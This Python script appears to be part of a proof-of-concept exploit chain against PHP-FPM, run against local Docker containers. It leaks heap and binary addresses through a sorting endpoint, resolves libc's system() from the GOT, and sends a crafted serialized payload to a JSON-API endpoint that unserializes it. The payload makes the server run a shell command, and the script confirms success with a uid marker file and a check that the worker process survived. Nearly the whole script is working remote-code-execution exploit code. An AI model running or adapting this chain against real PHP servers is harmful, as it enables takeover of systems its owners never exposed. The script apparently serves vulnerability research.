#!/usr/bin/env python3
"""Verify the offset-table fire's dispatch over a realistic non-echo JSON-API
sink. Leak+resolution (fpm_offsets_fire) run over the pure SORT sink
(order.php); the fire is delivered to jsonapi.php, which unserialize()s the
payload then normalises decoded objects with get_object_vars() (dispatching the
confused object's handler at 0xC0) while echoing only a status. Success per round
requires BOTH the uid=www-data marker AND worker survival (exit0 forces system()
to exit 0 -> NULL prop_ht -> HTTP 200, worker lives). jsonfire.php is a negative
control: json_encode aborts on the spray's invalid UTF-8 with default options.

  docker compose -f docker-compose.fpm-avenues.yml -p p2s-erd --profile erd up -d --build
  python3 -I poc/chains/verify_offsets_fire_jsonapi.py --runs 5
"""
import argparse, importlib.util, os, socket, subprocess, sys, time
from urllib.parse import quote_from_bytes, urlsplit

_POC = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_POC)  # poc/
def _load(f):
    _path = os.path.join(_POC, f)
    if not os.path.exists(_path): _path = os.path.join(_POC_ROOT, f)
    spec = importlib.util.spec_from_file_location(f[:-3], _path)
    m = importlib.util.module_from_spec(spec)
    for _p in (_POC, _POC_ROOT):
        if _p not in sys.path: sys.path.insert(0, _p)
    spec.loader.exec_module(m); return m
F = _load("fpm_offsets_fire.py"); X = _load("primitives/oracles/sideeffect_exfil_apps.py")

CONTAINER = "p2s-erd-fpm"; MARKER = "/tmp/m"; CMD = b"id>" + MARKER.encode()

def marker_reset(): subprocess.run(["docker","exec",CONTAINER,"sh","-c",f"rm -f {MARKER}"],capture_output=True)
def marker_read():
    r = subprocess.run(["docker","exec",CONTAINER,"sh","-c",f"cat {MARKER} 2>/dev/null"],capture_output=True,text=True)
    return r.stdout.strip()

def fire(host, port, path, payload):
    """Deliver the fire ONCE; return the HTTP status code -- 200 means the worker
    survived the system() return (prop_ht=NULL from an exit-0 command), 502 means
    it SEGV'd on a small-int prop_ht. None on a transport error."""
    body = b"rows=" + quote_from_bytes(payload).encode()
    req = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
           f"Content-Type: application/x-www-form-urlencoded\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()+body
    s = socket.socket(); s.settimeout(6); buf = b""
    try:
        s.connect((host,port)); s.sendall(req)
        while True:
            d = s.recv(65536)
            if not d: break
            buf += d
    except OSError:
        return None
    finally:
        s.close()
    time.sleep(0.3)
    line = buf.split(b"\r\n", 1)[0] if buf else b""
    try:
        return int(line.split()[1])
    except (IndexError, ValueError):
        return None

def one_shot(order_url, fire_host, fire_port, fire_path):
    """Full no-echo chain: leak+resolve over the sort sink, fire via fire_path."""
    u = urlsplit(order_url if "://" in order_url else "http://"+order_url)
    http = X.Http(u.hostname, u.port or 80)
    sort = X.OrderAdapter(http, "/order.php")
    if not sort.detect(): return None, None, "order.php not a sort sink"
    rec, chunk = X.exfil_chunk_pointer(sort, log=lambda*a,**k:None)
    bb, dtor, _ = X.exfil_binbase(sort, chunk, X.OBJ_OFF_SORT, log=lambda*a,**k:None)
    if bb is None: return None, None, "binbase not 2MB-aligned"
    t = F.select_table(dtor)
    if t is None: return None, None, f"no table for fp 0x{dtor & 0x1FFFFF:x}"
    rdr = F.SortReader(X, sort)
    system = rdr.read_qword(bb + t["GOT_FREE_SLOT"]) - t["LIBC_FREE_OFF"] + t["LIBC_SYSTEM_OFF"]
    ce = rdr.read_qword(bb + t["CSD_BSS_OFF"])
    spray = chunk + t["SPRAY_FIRE_OFF"] + 0x18   # per-build const spray home (--no-probe)
    payload = F.build_fire_payload(X._seo, ce, system, spray, CMD, t["GPF_HANDLER_OFF"])
    marker_reset(); status = fire(fire_host, fire_port, fire_path, payload)
    return marker_read(), status, f"binbase=0x{bb:x} system=0x{system:x} ce=0x{ce:x} spray=0x{spray:x} status={status} reqs={http.reqs}"

def main(argv=None):
    global CONTAINER
    ap = argparse.ArgumentParser()
    ap.add_argument("--order-url", default="http://127.0.0.1:8170/order.php")
    ap.add_argument("--fire-url",  default="http://127.0.0.1:8170/jsonapi.php")
    ap.add_argument("--runs", type=int, default=5)
    ap.add_argument("--container", default=CONTAINER,
                    help="fpm container to read the in-container uid marker from")
    ap.add_argument("--negative", default="http://127.0.0.1:8170/jsonfire.php",
                    help="json_encode control that must NOT fire ('' to skip)")
    a = ap.parse_args(argv)
    CONTAINER = a.container
    fu = urlsplit(a.fire_url)
    print(f"== no-echo JSON-API fire (leak/resolve: {a.order_url}; fire: {a.fire_url}) ==")
    ok = 0
    for i in range(a.runs):
        m, status, info = one_shot(a.order_url, fu.hostname, fu.port or 80, fu.path)
        uid = bool(m) and "uid=33" in m
        alive = (status == 200)          # the firing worker returned, not a respawn/502
        hit = uid and alive; ok += hit
        tag = ("FIRE uid=33 + worker ALIVE" if hit else
               "uid=33 but worker DIED (502/respawn)" if uid else "no-fire")
        print(f"  run {i+1}: {tag}  [{info}]")
    print(f"== get_object_vars dispatch (uid=33 AND worker-alive): {ok}/{a.runs} ==")
    if a.negative:
        nu = urlsplit(a.negative)
        m, status, _ = one_shot(a.order_url, nu.hostname, nu.port or 80, nu.path)
        neg = bool(m) and "uid=33" in m
        print(f"== json_encode control ({a.negative}): "
              f"{'FIRED (unexpected!)' if neg else 'no-fire (expected)'} (status={status}) ==")
    return 0 if ok == a.runs else 1

if __name__ == "__main__":
    sys.exit(main())
